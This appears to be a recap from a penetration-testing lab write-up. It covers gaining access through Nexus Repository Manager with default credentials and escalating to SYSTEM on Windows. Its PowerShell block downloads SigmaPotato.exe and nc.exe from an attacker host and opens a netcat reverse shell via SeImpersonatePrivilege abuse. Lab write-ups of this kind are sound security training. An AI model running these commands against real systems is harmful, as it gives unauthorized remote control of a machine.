#### Recap
Port 80 offered no useful leads. Port 8081 exposed Nexus Repository Manager 3.21.0-05. Default credentials made the authenticated execution issue reachable, leading to access as Nathan and the first flag.

Search path and executable replacement checks did not yield viable paths. An impersonation-based test changed local group membership, but the existing shell could not reliably switch to the new administrator account.
Direct session creation through the impersonation path initially failed. After restarting the lab, a repeated test yielded a SYSTEM shell. The cause of the earlier connection failures was not confirmed.
```powershell
iwr -uri http://192.168.45.189:8000/SigmaPotato.exe -OutFile SigmaPotato.exe
iwr -uri http://192.168.45.189:8000/nc.exe -OutFile nc.exe

# Requires SeImpersonatePrivilege
.\SigmaPotato.exe ".\nc.exe -e cmd 192.168.45.189 1331"
```

The failed attempts and the successful result illustrated several local Windows privilege boundaries.
1. Review writable parent directories for services with unsafe executable paths.
2. Check whether a privileged startup process trusts an executable writable by a lower-privileged account.
3. Separate SeDebugPrivilege requirements from other local privilege escalation paths.
4. A token may be able to change local group membership even when an existing shell cannot switch identities.
5. Verify the effective identity in a new session when the existing session cannot change accounts.
